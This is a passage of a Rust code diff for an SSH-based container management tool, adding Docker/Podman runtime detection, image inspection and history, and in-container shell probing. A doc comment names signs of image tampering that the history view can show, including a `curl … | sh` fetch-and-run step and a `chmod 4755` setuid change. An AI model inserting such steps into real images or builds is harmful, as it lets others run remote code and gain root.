@@ -14,6 +14,7 @@ use std::{
 };
 
 use async_trait::async_trait;
+use chrono::{DateTime, Utc};
 use serde::{Deserialize, Serialize};
 use serde_json::{Map, Value};
 use sha2::{Digest, Sha256};
@@ -39,8 +40,35 @@ const MAX_INSPECT_BYTES: usize = 1_000_000;
 const MAX_NETWORK_METADATA_ENTRIES: usize = 256;
 const MAX_SECURITY_AUDIT_BYTES: usize = 16 * 1024 * 1024;
 const MAX_SECURITY_FINDINGS: usize = 10_000;
+
+/// Asks the host which runtimes exist and which of them answers.
+///
+/// `ps -q` rather than `info`: on a host whose daemon is stopped, `info` sits
+/// there until something times out, while `ps` fails immediately against the
+/// missing socket. Docker wins when both answer, because a host with both
+/// almost always keeps its workloads under Docker.
+const RUNTIME_PROBE_COMMAND: &str = r#"for lr_rt in docker podman; do
+  if command -v "$lr_rt" >/dev/null 2>&1; then
+    if "$lr_rt" ps -q >/dev/null 2>&1; then
+      printf '%s\tusable\n' "$lr_rt"
+    else
+      printf '%s\tinstalled\n' "$lr_rt"
+    fi
+  fi
+done"#;
 pub const MAX_CONTAINER_FILE_BYTES: usize = 2 * 1024 * 1024;
 pub const MAX_DOCKER_FILE_COPY_BYTES: u64 = 64 * 1024 * 1024;
+
+/// What the host said when asked which container runtimes it has.
+#[derive(Debug, Clone, Default, PartialEq, Eq)]
+pub struct ContainerRuntimeProbe {
+    /// The runtime that answered, and therefore the only one worth asking
+    /// anything else. `None` means every question after this one is moot.
+    pub usable: Option<ContainerRuntime>,
+    /// Every runtime whose binary exists, answering or not. A Docker here
+    /// with `usable` empty is a stopped daemon, not an absent runtime.
+    pub installed: Vec<ContainerRuntime>,
+}
 
 #[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
 #[serde(rename_all = "lowercase")]
@@ -50,7 +78,12 @@ pub enum ContainerRuntime {
 }
 
 impl ContainerRuntime {
-    const fn command(self) -> &'static str {
+    /// The program name, for building a command against this runtime.
+    ///
+    /// Crate-visible rather than module-private: the command workbench runs
+    /// its catalog inside containers too, and it must reach the same binary
+    /// this module would rather than keep a second copy of the mapping.
+    pub(crate) const fn command(self) -> &'static str {
         match self {
             Self::Docker => "docker",
             Self::Podman => "podman",
@@ -84,6 +117,15 @@ impl ContainerIdentity {
 
     pub fn id(&self) -> &str {
         &self.id
+    }
+
+    /// The twelve-character form the runtime itself prints.
+    ///
+    /// For showing a person, so what the pane displays matches what they see
+    /// in `docker ps` on the machine. Never for addressing anything: the full
+    /// id is what every command is built from.
+    pub fn short_id(&self) -> &str {
+        short_id(&self.id)
     }
 
     pub fn stable_key(&self) -> String {
@@ -136,8 +178,17 @@ pub struct ContainerSummary {
 }
 
 impl ContainerSummary {
-    pub fn can_open_terminal(&self) -> bool {
+    /// Whether this container has a running process namespace.
+    ///
+    /// The question behind several different offers — a shell, a command run
+    /// inside it — so it is named for what it asks rather than for one of the
+    /// things that ask it.
+    pub fn is_running(&self) -> bool {
         self.state.eq_ignore_ascii_case("running")
+    }
+
+    pub fn can_open_terminal(&self) -> bool {
+        self.is_running()
     }
 }
 
@@ -178,6 +229,10 @@ impl ContainerTerminalSession {
 
 #[async_trait]
 impl TerminalTransport for ContainerTerminalSession {
+    fn events(&self) -> &TerminalEventReceiver {
+        self.inner.events()
+    }
+
     async fn write_input(&self, bytes: Vec<u8>) -> CoreResult<()> {
         self.target.validate(&self.guard)?;
         let result = TerminalTransport::write_input(&self.inner, bytes).await;
@@ -211,12 +266,63 @@ pub struct ContainerStats {
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
 pub struct ContainerImage {
+    pub runtime: ContainerRuntime,
     pub id: String,
     pub repository: String,
     pub tag: String,
     pub digest: String,
     pub created_at: String,
     pub size: String,
+}
+
+impl ContainerImage {
+    pub fn stable_key(&self) -> String {
+        format!("{}:image:{}", self.runtime.command(), self.id)
+    }
+
+    /// The 12 characters a runtime prints for this image, without the
+    /// `sha256:` the long form carries. Display only: nothing is looked up by
+    /// it, because a short id is not unique by construction.
+    pub fn short_id(&self) -> &str {
+        let bare = self.id.strip_prefix("sha256:").unwrap_or(&self.id);
+        &bare[..bare.len().min(12)]
+    }
+}
+
+/// One step of `image history` — the instruction that built a layer.
+///
+/// This is where a tampered image shows itself: the added `curl … | sh`, the
+/// extra `COPY`, the `chmod 4755`. The instruction text is whatever the
+/// runtime recorded and is displayed as-is.
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+pub struct DockerImageHistoryStep {
+    pub id: String,
+    pub created_at: String,
+    pub created_by: String,
+    pub size: String,
+    pub comment: String,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
+pub struct DockerImageInspection {
+    pub image: ContainerImage,
+    pub architecture: String,
+    pub os: String,
+    pub author: String,
+    /// The user the image runs as. Empty means the image never set one, which
+    /// is the same as root — the reader is told which of the two it is.
+    pub user: String,
+    pub entrypoint: Vec<String>,
+    pub command: Vec<String>,
+    pub working_dir: String,
+    pub environment: Vec<String>,
+    pub exposed_ports: Vec<String>,
+    pub declared_volumes: Vec<String>,
+    pub labels: BTreeMap<String, String>,
+    pub layers: Vec<String>,
+    pub repo_tags: Vec<String>,
+    pub repo_digests: Vec<String>,
+    pub history: Vec<DockerImageHistoryStep>,
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
@@ -1226,6 +1332,32 @@ impl DockerService {
         Self { ssh, target }
     }
 
+    /// Which container runtime this host can actually be asked about.
+    ///
+    /// Assuming Docker is wrong on a large share of real machines: openEuler,
+    /// Anolis and RHEL-family hosts ship Podman and often no `docker` at all,
+    /// and a page that only ever ran `docker ps` reads as "no containers here"
+    /// on every one of them — a false negative, and the worst kind, because it
+    /// looks like an answer.
+    ///
+    /// Installed and usable are reported apart on purpose. A Docker binary
+    /// with a stopped daemon is a thing an operator can fix; "this host has no
+    /// container runtime" is a thing they should stop looking for.
+    pub async fn detect_runtime(
+        &self,
+        session: &BoundSshSession,
+    ) -> CoreResult<ContainerRuntimeProbe> {
+        let output = self
+            .read_command(
+                session,
+                RUNTIME_PROBE_COMMAND.to_owned(),
+                Duration::from_secs(20),
+                "detect container runtime",
+            )
+            .await?;
+        Ok(parse_runtime_probe(&output))
+    }
+
     pub async fn list(
         &self,
         session: &BoundSshSession,
@@ -1278,7 +1410,44 @@ impl DockerService {
                 "list container images",
             )
             .await?;
-        parse_images(&output)
+        parse_images(runtime, &output)
+    }
+
+    /// What an image is made of: how it was configured, and how it was built.
+    ///
+    /// Two commands rather than one, because they answer different questions
+    /// and only the pair is useful. `image inspect` says what the image will
+    /// do when it starts — the user it runs as, the entrypoint, the baked-in
+    /// environment. `image history` says how it got that way, which is where a
+    /// layer someone added shows up. A history that cannot be read does not
+    /// fail the inspection: an image pulled by digest has no local history,
+    /// and the configuration is still worth showing.
+    pub async fn inspect_image(
+        &self,
+        session: &BoundSshSession,
+        image: &ContainerImage,
+    ) -> CoreResult<DockerImageInspection> {
+        let output = self
+            .read_command(
+                session,
+                image_inspect_command(image)?,
+                Duration::from_secs(20),
+                "inspect container image",
+            )
+            .await?;
+        let mut inspection = parse_image_inspection(image, &output)?;
+        if let Ok(history) = self
+            .read_command(
+                session,
+                image_history_command(image)?,
+                Duration::from_secs(20),
+                "read container image history",
+            )
+            .await
+        {
+            inspection.history = parse_image_history(&history)?;
+        }
+        Ok(inspection)
     }
 
     pub async fn networks(
@@ -1734,6 +1903,56 @@ impl DockerService {
         })
     }
 
+    /// Pick the best shell that actually exists inside a container.
+    ///
+    /// Asking for `bash` everywhere fails on the many images that only ship
+    /// busybox, and always asking for `sh` gives up line editing and history on
+    /// the images that do have bash. Neither guess is right often enough to
+    /// make the operator carry it, so the probe answers it once per session.
+    ///
+    /// A container with no shell at all — `scratch`, distroless — is a real
+    /// answer, not a failure to detect: say so plainly instead of opening a
+    /// terminal that dies on the first keystroke.
+    pub async fn detect_shell(
+        &self,
+        session: &BoundSshSession,
+        container: &ContainerIdentity,
+    ) -> CoreResult<ContainerShell> {
+        self.target.validate(session.target())?;
+        validate_container_id(container.id())?;
+        // State first, because the probe cannot tell the two apart. Exec into a
+        // stopped container produces no output, which is indistinguishable
+        // from an image with no shell — and answering "这个容器里没有可用的
+        // shell" for a container that is merely stopped sends the operator off
+        // to rebuild an image when all they had to do was start it.
+        let state = self.probe_state(session, container).await?;
+        if state != "running" {
+            return Err(CoreError::validation(
+                "container terminal",
+                format!("container must be running; current state is {state}"),
+            ));
+        }
+        // Run through `sh -c` rather than testing each program with its own
+        // exec: three round trips over SSH to learn one word is three times the
+        // latency for no more information.
+        let command = format!(
+            "{} exec -- {} /bin/sh -c {} 2>/dev/null",
+            container.runtime.command(),
+            shq(container.id()),
+            shq(SHELL_PROBE_SCRIPT),
+        );
+        let output = self
+            .read_command(
+                session,
+                command,
+                Duration::from_secs(15),
+                "detect container shell",
+            )
+            .await?;
+        self.target.validate(session.target())?;
+        parse_shell_probe(&output)
+    }
+
     /// Open a target-bound interactive PTY in a running container.
     ///
     /// The caller can select only a validated runtime/container identity and a
@@ -1744,6 +1963,7 @@ impl DockerService {
         session: &BoundSshSession,
         container: &ContainerIdentity,
         shell: ContainerShell,
+        terminal_id: String,
         columns: u16,
         rows: u16,
     ) -> CoreResult<ContainerTerminalSession> {
@@ -1761,7 +1981,11 @@ impl DockerService {
             ContainerRuntime::Docker => ContainerPtyRuntime::Docker,
             ContainerRuntime::Podman => ContainerPtyRuntime::Podman,
         };
-        let terminal_id = format!("container-{}", uuid::Uuid::new_v4());
+        // The id comes from the caller and is not minted here. Every event
+        // this session emits carries it, and the caller matches events against
+        // the id it is holding — one invented in here would fail that check on
+        // the first byte of output, which is a mismatch no amount of unit
+        // testing on either side would show.
         let inner = self
             .ssh
             .open_container_terminal_bound(
@@ -2247,8 +2471,12 @@ impl DockerService {
         container: &ContainerIdentity,
     ) -> CoreResult<String> {
         validate_container_id(container.id())?;
+        // `{{"\t"}}` and not a bare `\t`: the runtime hands the format string
+        // to a Go template, which prints an unquoted backslash-t as those two
+        // characters. The parser splits on a real tab, so a bare escape means
+        // every state probe fails to parse and no action can ever be planned.
         let command = format!(
-            "{} inspect --format '{{{{.Id}}}}\\t{{{{.State.Status}}}}' -- {}",
+            "{} inspect --format '{{{{.Id}}}}{{{{\"\\t\"}}}}{{{{.State.Status}}}}' -- {}",
             container.runtime.command(),
             shq(container.id())
         );
@@ -3700,21 +3928,35 @@ impl OperationExecutor for DockerActionExecutor<'_> {
             return Ok(VerificationResult {
                 passed,
                 detail: if passed {
-                    "container no longer exists".to_owned()
+                    "容器已经不存在了。".to_owned()
                 } else {
-                    "container still exists or removal verification timed out".to_owned()
+                    "容器还在，或者删除后的复核超时了。".to_owned()
                 },
             });
         }
         let state = successful_output("verify container state", output)?;
-        let state = sanitize_line(state.trim(), 64);
+        // The state is one word on its own line. Taking the whole output would
+        // glue a runtime's deprecation warning onto it, and the comparison
+        // below would then fail for a change that worked — telling the
+        // operator nothing was done when something was.
+        let state = sanitize_line(first_output_line(&state), 64);
+        let passed = self
+            .action
+            .expected_states
+            .iter()
+            .any(|value| value == &state);
+        // Says the state whether it passed or not: on failure that reading is
+        // the only thing telling the operator what the host actually did.
         Ok(VerificationResult {
-            passed: self
-                .action
-                .expected_states
-                .iter()
-                .any(|value| value == &state),
-            detail: format!("observed container state: {state}"),
+            passed,
+            detail: if passed {
+                format!("复核读回的状态是 {state}，与预期一致。")
+            } else {
+                format!(
+                    "复核读回的状态是 {state}，预期 {}。",
+                    self.action.expected_states.join(" 或 ")
+                )
+            },
         })
     }
 
@@ -3740,7 +3982,7 @@ impl OperationExecutor for DockerActionExecutor<'_> {
         {
             return Err(CoreError::validation(
                 "Docker restore verification",
-                format!("observed container state {restored}"),
+                format!("回滚后读回的状态是 {restored}，没有回到操作前的样子"),
             ));
         }
         Ok(())
@@ -4060,33 +4302,36 @@ fn build_action_plan(
         ContainerAction::Kill => vec!["exited".to_owned(), "dead".to_owned()],
         ContainerAction::Remove => Vec::new(),
     };
+    // These two strings are what the operator reads before approving, so they
+    // are written for a person: what will happen, and what putting it back
+    // would mean. The shell verbs above stay as the runtime spells them.
     let (restore_command, restore_expected_states, restore_description) = match request.action {
         ContainerAction::Start if before_state == "exited" => (
             Some(format!("{runtime} stop -- {id}")),
             vec![before_state.clone()],
-            Some("stop the container and restore its previous exited state".to_owned()),
+            Some("把容器停回原来的已退出状态".to_owned()),
         ),
         ContainerAction::Stop if before_state == "paused" => (
             Some(format!(
                 "{runtime} start -- {id} && {runtime} pause -- {id}"
             )),
             vec!["paused".to_owned()],
-            Some("restart and pause the container".to_owned()),
+            Some("重新启动容器并暂停，回到原来的暂停状态".to_owned()),
         ),
         ContainerAction::Stop => (
             Some(format!("{runtime} start -- {id}")),
             vec!["running".to_owned()],
-            Some("restart the container".to_owned()),
+            Some("把容器重新启动起来".to_owned()),
         ),
         ContainerAction::Pause => (
             Some(format!("{runtime} unpause -- {id}")),
             vec!["running".to_owned()],
-            Some("unpause the container".to_owned()),
+            Some("恢复容器运行".to_owned()),
         ),
         ContainerAction::Unpause => (
             Some(format!("{runtime} pause -- {id}")),
             vec!["paused".to_owned()],
-            Some("pause the container again".to_owned()),
+            Some("把容器重新暂停".to_owned()),
         ),
         ContainerAction::Start
         | ContainerAction::Restart
@@ -4096,9 +4341,9 @@ fn build_action_plan(
     let mut operation = OperationPlan::new(
         target,
         format!(
-            "{} container {} ({})",
-            request.action.verb(),
-            request.container.id(),
+            "{}容器 {}（{}，当前状态 {before_state}）",
+            request.action.label(),
+            short_id(request.container.id()),
             request.container.runtime.label()
         ),
         true,
@@ -4165,6 +4410,17 @@ fn validate_runtime_hex_id(subject: &'static str, value: &str) -> CoreResult<()>
             "must be a 12..=64 character hexadecimal runtime id",
         ))
     }
+}
+
+/// An image id, in either of the two forms a runtime prints it: the digest
+/// form `sha256:<64 hex>` that `--no-trunc` gives, or the bare hex that the
+/// truncated listing gives. Podman prints the bare form even with
+/// `--no-trunc`, so both have to be accepted.
+fn validate_image_id(value: &str) -> CoreResult<()> {
+    validate_runtime_hex_id(
+        "container image id",
+        value.strip_prefix("sha256:").unwrap_or(value),
+    )
 }
 
 fn validate_volume_name(value: &str) -> CoreResult<()> {
@@ -4250,6 +4506,24 @@ fn network_inspect_command(network: &DockerNetwork) -> CoreResult<String> {
     ))
 }
 
+fn image_inspect_command(image: &ContainerImage) -> CoreResult<String> {
+    validate_image_id(&image.id)?;
+    Ok(format!(
+        "{} image inspect -- {}",
+        image.runtime.command(),
+        shq(&image.id)
+    ))
+}
+
+fn image_history_command(image: &ContainerImage) -> CoreResult<String> {
+    validate_image_id(&image.id)?;
+    Ok(format!(
+        "{} image history --no-trunc --format '{{{{json .}}}}' -- {}",
+        image.runtime.command(),
+        shq(&image.id)
+    ))
+}
+
 fn volume_inspect_command(volume: &DockerVolume) -> CoreResult<String> {
     validate_volume_name(&volume.name)?;
     Ok(format!(
@@ -4303,18 +4577,30 @@ fn parse_container_list(
     let (rows, truncated) = json_rows(output, "container list")?;
     let mut items = Vec::with_capacity(rows.len());
     for row in rows {
-        let identity = ContainerIdentity::new(runtime, required_json_text(&row, "ID")?)?;
+        // Docker and Podman print the same command's output in different
+        // shapes, so every field is read from whichever key is actually there.
+        // Reading only Docker's names made a Podman host answer "no
+        // containers", which is not a smaller answer — it is a wrong one.
+        let identity = ContainerIdentity::new(runtime, required_json_alias(&row, &["ID", "Id"])?)?;
         items.push(ContainerSummary {
             identity,
-            name: json_text(&row, "Names", 256)
-                .trim_start_matches('/')
-                .to_owned(),
+            name: container_name(&row),
             image: json_text(&row, "Image", 1_024),
             state: json_text(&row, "State", 64).to_ascii_lowercase(),
-            status: json_text(&row, "Status", 512),
-            ports: json_text(&row, "Ports", 4_096),
-            created_at: json_text(&row, "CreatedAt", 512),
-            command: json_text(&row, "Command", 4_096),
+            // Podman leaves `Status` empty for a running container and puts
+            // the answer in `State`; an empty status column would read as
+            // "unknown" rather than "running".
+            status: first_non_empty(&[
+                json_text(&row, "Status", 512),
+                json_text(&row, "State", 512),
+            ]),
+            ports: container_ports(&row),
+            // Podman's `CreatedAt` is empty and `Created` carries the time.
+            created_at: first_non_empty(&[
+                json_text(&row, "CreatedAt", 512),
+                json_text(&row, "Created", 512),
+            ]),
+            command: text_or_joined(&row, "Command", 4_096),
         });
     }
     items.sort_by(|left, right| {
@@ -4356,17 +4642,27 @@ fn parse_container_stats(
     Ok(DockerCollection { items, truncated })
 }
 
-fn parse_images(output: &str) -> CoreResult<DockerCollection<ContainerImage>> {
+fn parse_images(
+    runtime: ContainerRuntime,
+    output: &str,
+) -> CoreResult<DockerCollection<ContainerImage>> {
     let (rows, truncated) = json_rows(output, "container images")?;
     let mut items = rows
         .into_iter()
         .map(|row| ContainerImage {
-            id: json_text(&row, "ID", 256),
-            repository: json_text(&row, "Repository", 1_024),
-            tag: json_text(&row, "Tag", 512),
-            digest: json_text(&row, "Digest", 256),
-            created_at: json_text(&row, "CreatedAt", 512),
-            size: json_text(&row, "Size", 128),
+            runtime,
+            // Podman names these fields in lowercase where Docker uses
+            // PascalCase, the same split the network listing has.
+            id: json_alias_text(&row, &["ID", "Id", "id"], 256),
+            repository: json_alias_text(&row, &["Repository", "repository"], 1_024),
+            tag: json_alias_text(&row, &["Tag", "tag"], 512),
+            digest: json_alias_text(&row, &["Digest", "digest"], 256),
+            // Docker prints a formatted date and a human size; Podman prints a
+            // Unix timestamp and a byte count, as numbers. Left raw, the
+            // columns read "1776383606" and "8104044", so both are turned into
+            // the thing Docker would have written.
+            created_at: image_created_text(&row),
+            size: image_size_text(&row),
         })
         .collect::<Vec<_>>();
     items.sort_by(|left, right| {
@@ -4387,7 +4683,9 @@ fn parse_networks(
     let mut seen = BTreeSet::new();
     let mut items = Vec::with_capacity(rows.len());
     for row in rows {
-        let id = required_json_text(&row, "ID")?;
+        // Podman prints this listing in snake_case where Docker uses
+        // PascalCase, so each field is read from whichever name is there.
+        let id = required_json_alias(&row, &["ID", "id"])?;
         validate_runtime_hex_id("container network id", &id)?;
         if !seen.insert(id.clone()) {
             return Err(CoreError::validation(
@@ -4395,15 +4693,23 @@ fn parse_networks(
                 "runtime returned a duplicate network id",
             ));
         }
-        let name = required_json_text(&row, "Name")?;
+        let name = required_json_alias(&row, &["Name", "name"])?;
         items.push(DockerNetwork {
             runtime,
             id,
             name,
-            driver: json_text(&row, "Driver", 128),
-            scope: json_text(&row, "Scope", 128),
-            internal: json_bool(&row, "Internal"),
-            ipv6: json_bool(&row, "IPv6"),
+            driver: json_alias_text(&row, &["Driver", "driver"], 128),
+            // Podman has no scope: its networks are always local to the host,
+            // and saying so is better than an empty column.
+            scope: first_non_empty(&[
+                json_alias_text(&row, &["Scope", "scope"], 128),
+                match runtime {
+                    ContainerRuntime::Podman => "local".to_owned(),
+                    ContainerRuntime::Docker => String::new(),
+                },
+            ]),
+            internal: json_alias_bool(&row, &["Internal", "internal"]),
+            ipv6: json_alias_bool(&row, &["IPv6", "ipv6_enabled"]),
         });
     }
     items.sort_by(|left, right| {
@@ -4455,7 +4761,7 @@ fn parse_network_inspection(
         ));
     }
     validate_runtime_hex_id("container network id", &expected.id)?;
-    let value: Value = serde_json::from_str(output).map_err(|error| {
+    let value: Value = serde_json::from_str(json_array_body(output)).map_err(|error| {
         CoreError::validation("container network inspection", error.to_string())
     })?;
     let records = value.as_array().ok_or_else(|| {
@@ -4570,7 +4876,7 @@ fn parse_volume_inspection(
         ));
     }
     validate_volume_name(&expected.name)?;
-    let value: Value = serde_json::from_str(output)
+    let value: Value = serde_json::from_str(json_array_body(output))
         .map_err(|error| CoreError::validation("container volume inspection", error.to_string()))?;
     let records = value.as_array().ok_or_else(|| {
         CoreError::validation("container volume inspection", "expected a JSON array")
@@ -4606,6 +4912,197 @@ fn parse_volume_inspection(
         options: bounded_string_map(record.get("Options"), "container volume options")?,
         labels,
     })
+}
+
+fn parse_image_inspection(
+    expected: &ContainerImage,
+    output: &str,
+) -> CoreResult<DockerImageInspection> {
+    if output.len() > MAX_INSPECT_BYTES {
+        return Err(CoreError::validation(
+            "container image inspection",
+            "runtime response exceeds the 1 MB typed inspection boundary",
+        ));
+    }
+    validate_image_id(&expected.id)?;
+    let value: Value = serde_json::from_str(json_array_body(output))
+        .map_err(|error| CoreError::validation("container image inspection", error.to_string()))?;
+    let records = value.as_array().ok_or_else(|| {
+        CoreError::validation("container image inspection", "expected a JSON array")
+    })?;
+    if records.len() != 1 {
+        return Err(CoreError::validation(
+            "container image inspection",
+            "runtime must return exactly one image record",
+        ));
+    }
+    let record = records[0].as_object().ok_or_else(|| {
+        CoreError::validation("container image inspection", "expected a JSON object")
+    })?;
+    let id = required_json_text(record, "Id")?;
+    validate_image_id(&id)?;
+    // The two forms of the same id compare equal: the listing and the
+    // inspection do not always agree on whether the `sha256:` prefix is there.
+    if bare_image_id(&id) != bare_image_id(&expected.id) {
+        return Err(CoreError::validation(
+            "container image inspection",
+            "runtime returned a different image identity",
+        ));
+    }
+
+    let config = record.get("Config").and_then(Value::as_object);
+    let read_config_list = |key: &str| {
+        config
+            .map(|config| bounded_text_list(config.get(key)))
+            .unwrap_or_default()
+    };
+
+    Ok(DockerImageInspection {
+        image: ContainerImage {
+            runtime: expected.runtime,
+            id,
+            repository: expected.repository.clone(),
+            tag: expected.tag.clone(),
+            digest: expected.digest.clone(),
+            created_at: json_text(record, "Created", 512),
+            size: expected.size.clone(),
+        },
+        architecture: json_text(record, "Architecture", 128),
+        os: json_text(record, "Os", 128),
+        author: json_text(record, "Author", 512),
+        user: config
+            .map(|config| json_text(config, "User", 256))
+            .unwrap_or_default(),
+        entrypoint: read_config_list("Entrypoint"),
+        command: read_config_list("Cmd"),
+        working_dir: config
+            .map(|config| json_text(config, "WorkingDir", 1_024))
+            .unwrap_or_default(),
+        environment: read_config_list("Env"),
+        // Both of these are JSON objects whose keys carry the value and whose
+        // values are empty objects, so only the keys are worth reading.
+        exposed_ports: config
+            .map(|config| bounded_object_keys(config.get("ExposedPorts")))
+            .unwrap_or_default(),
+        declared_volumes: config
+            .map(|config| bounded_object_keys(config.get("Volumes")))
+            .unwrap_or_default(),
+        labels: config
+            .map(|config| bounded_string_map(config.get("Labels"), "container image labels"))
+            .transpose()?
+            .unwrap_or_default(),
+        layers: record
+            .get("RootFS")
+            .and_then(Value::as_object)
+            .map(|root| bounded_text_list(root.get("Layers")))
+            .unwrap_or_default(),
+        repo_tags: bounded_text_list(record.get("RepoTags")),
+        repo_digests: bounded_text_list(record.get("RepoDigests")),
+        history: Vec::new(),
+    })
+}
+
+fn parse_image_history(output: &str) -> CoreResult<Vec<DockerImageHistoryStep>> {
+    let (rows, _) = json_rows(output, "container image history")?;
+    Ok(rows
+        .into_iter()
+        .map(|row| DockerImageHistoryStep {
+            // A layer that came from a pulled image has no id of its own, and
+            // the runtime prints `<missing>` there. That is a real answer, so
+            // it is kept rather than blanked.
+            id: json_alias_text(&row, &["ID", "Id", "id"], 256),
+            created_at: json_alias_text(&row, &["CreatedAt", "Created", "created"], 512),
+            created_by: json_alias_text(&row, &["CreatedBy", "createdby"], 8_192),
+            size: json_alias_text(&row, &["Size", "size"], 128),
+            comment: json_alias_text(&row, &["Comment", "comment"], 1_024),
+        })
+        .collect())
+}
+
+fn bare_image_id(value: &str) -> &str {
+    value.strip_prefix("sha256:").unwrap_or(value)
+}
+
+/// When the image was built, however the runtime chose to say it.
+///
+/// Docker writes a formatted date under `CreatedAt`. Podman writes Unix
+/// seconds under `Created`, as a number — which reads as a meaningless run of
+/// digits unless it is turned back into a date.
+fn image_created_text(row: &Map<String, Value>) -> String {
+    for key in ["CreatedAt", "createdat"] {
+        let text = json_text(row, key, 512);
+        if !text.is_empty() {
+            return text;
+        }
+    }
+    match row.get("Created").or_else(|| row.get("created")) {
+        Some(Value::String(value)) => sanitize_line(value, 512),
+        Some(Value::Number(value)) => value
+            .as_i64()
+            .and_then(|seconds| DateTime::<Utc>::from_timestamp(seconds, 0))
+            .map(|moment| moment.format("%Y-%m-%d %H:%M:%S UTC").to_string())
+            .unwrap_or_default(),
+        _ => String::new(),
+    }
+}
+
+/// How big the image is, however the runtime chose to say it.
+///
+/// Docker writes "12.2MB"; Podman writes the byte count as a number. A raw
+/// byte count in a size column is a number nobody reads, so it is rendered the
+/// way the other runtime would have.
+fn image_size_text(row: &Map<String, Value>) -> String {
+    match row.get("Size").or_else(|| row.get("size")) {
+        Some(Value::String(value)) => sanitize_line(value, 128),
+        Some(Value::Number(value)) => value.as_u64().map(human_bytes).unwrap_or_default(),
+        _ => String::new(),
+    }
+}
+
+fn human_bytes(value: u64) -> String {
+    const UNITS: [&str; 5] = ["B", "kB", "MB", "GB", "TB"];
+    let mut size = value as f64;
+    let mut unit = 0;
+    while size >= 1000.0 && unit + 1 < UNITS.len() {
+        size /= 1000.0;
+        unit += 1;
+    }
+    if unit == 0 {
+        format!("{value}B")
+    } else {
+        format!("{size:.1}{}", UNITS[unit])
+    }
+}
+
+/// A JSON array of strings, bounded the same way every other runtime list is.
+/// Anything that is not an array reads as empty rather than failing: these are
+/// optional configuration fields, and `null` is how a runtime says "unset".
+fn bounded_text_list(value: Option<&Value>) -> Vec<String> {
+    value
+        .and_then(Value::as_array)
+        .map(|rows| {
+            rows.iter()
+                .take(MAX_NETWORK_METADATA_ENTRIES)
+                .map(|row| value_text(row, 8_192))
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// The keys of a JSON object, for the fields where the runtime puts the answer
+/// in the key and leaves the value empty (`ExposedPorts`, `Volumes`).
+fn bounded_object_keys(value: Option<&Value>) -> Vec<String> {
+    value
+        .and_then(Value::as_object)
+        .map(|object| {
+            object
+                .keys()
+                .take(MAX_NETWORK_METADATA_ENTRIES)
+                .map(|key| sanitize_line(key, 256))
+                .filter(|key| !key.is_empty())
+                .collect()
+        })
+        .unwrap_or_default()
 }
 
 fn bounded_string_map(
@@ -4651,7 +5148,7 @@ fn parse_compose_projects(
             "runtime response exceeds the 1 MB typed inventory boundary",
         ));
     }
-    let value: Value = serde_json::from_str(output)
+    let value: Value = serde_json::from_str(json_array_body(output))
         .map_err(|error| CoreError::validation("compose projects", error.to_string()))?;
     let rows = value
         .as_array()
@@ -4710,7 +5207,7 @@ fn parse_inspection(expected: &ContainerIdentity, output: &str) -> CoreResult<Co
             "runtime response exceeds the 1 MB typed inspection boundary",
         ));
     }
-    let value: Value = serde_json::from_str(output)
+    let value: Value = serde_json::from_str(json_array_body(output))
         .map_err(|error| CoreError::validation("container inspection", error.to_string()))?;
     let object = value
         .as_array()
@@ -4864,7 +5361,7 @@ fn parse_security_inspections(
             "runtime response exceeds the 16 MiB audit boundary",
         ));
     }
-    let rows = serde_json::from_str::<Value>(output)
+    let rows = serde_json::from_str::<Value>(json_array_body(output))
         .map_err(|error| CoreError::validation("Docker security audit", error.to_string()))?;
     let rows = rows
         .as_array()
@@ -5259,13 +5756,85 @@ impl BTreeMapView {
     }
 }
 
-fn parse_state_probe(container: &ContainerIdentity, output: &str) -> CoreResult<String> {
-    let (id, state) = output.trim().split_once('\t').ok_or_else(|| {
+/// The leading twelve characters, which is how the runtime itself shows an id.
+///
+/// Only for lines a person reads. The full id stays in the operation metadata,
+/// where an audit record needs it, and every command is built from the whole
+/// thing — a summary is a description, never an ingredient.
+fn short_id(id: &str) -> &str {
+    match id.char_indices().nth(12) {
+        Some((boundary, _)) => &id[..boundary],
+        None => id,
+    }
+}
+
+/// Reads the runtime probe's `name<TAB>state` lines.
+///
+/// Anything unrecognised is dropped rather than guessed at: this decides which
+/// binary every later command will run, so a line that is not exactly one of
+/// the two known names must not become one of them.
+fn parse_runtime_probe(output: &str) -> ContainerRuntimeProbe {
+    let mut probe = ContainerRuntimeProbe::default();
+    for line in output.lines() {
+        let Some((name, state)) = line.trim().split_once('\t') else {
+            continue;
+        };
+        let runtime = match name {
+            "docker" => ContainerRuntime::Docker,
+            "podman" => ContainerRuntime::Podman,
+            _ => continue,
+        };
+        if !probe.installed.contains(&runtime) {
+            probe.installed.push(runtime);
+        }
+        // Docker wins when both answer, and the probe emits it first, so the
+        // first usable line is the one to keep.
+        if state == "usable" && probe.usable.is_none() {
+            probe.usable = Some(runtime);
+        }
+    }
+    probe
+}
+
+/// Prints the name of the best shell present, or nothing at all.
+///
+/// `command -v` and not `test -x /bin/bash`: some images put bash somewhere
+/// else on PATH, and one that is on PATH is the one the exec will find. Ash is
+/// preferred over plain sh when both resolve, because on busybox images `sh` is
+/// a link to ash anyway and naming ash gets line editing.
+const SHELL_PROBE_SCRIPT: &str = "for lr_sh in bash ash sh; do if command -v \"$lr_sh\" >/dev/null 2>&1; \
+     then echo \"$lr_sh\"; exit 0; fi; done; exit 0";
+
+fn parse_shell_probe(output: &str) -> CoreResult<ContainerShell> {
+    // Same rule as everywhere else in here: a runtime warning may sit in front
+    // of the answer, so look for the answer rather than reading line one.
+    let shell = output.lines().map(str::trim).find_map(|line| match line {
+        "bash" => Some(ContainerShell::Bash),
+        "ash" => Some(ContainerShell::Ash),
+        "sh" => Some(ContainerShell::Sh),
+        _ => None,
+    });
+    shell.ok_or_else(|| {
         CoreError::validation(
-            "container state",
-            "runtime returned an invalid state record",
+            "container shell",
+            "这个容器里没有可用的 shell（bash、ash、sh 都没有），打不开终端",
         )
-    })?;
+    })
+}
+
+fn parse_state_probe(container: &ContainerIdentity, output: &str) -> CoreResult<String> {
+    // The record, not the whole output: a runtime that greeted the command
+    // with a deprecation warning would otherwise make every action impossible
+    // to plan. The record is the line carrying the separator.
+    let (id, state) = output
+        .lines()
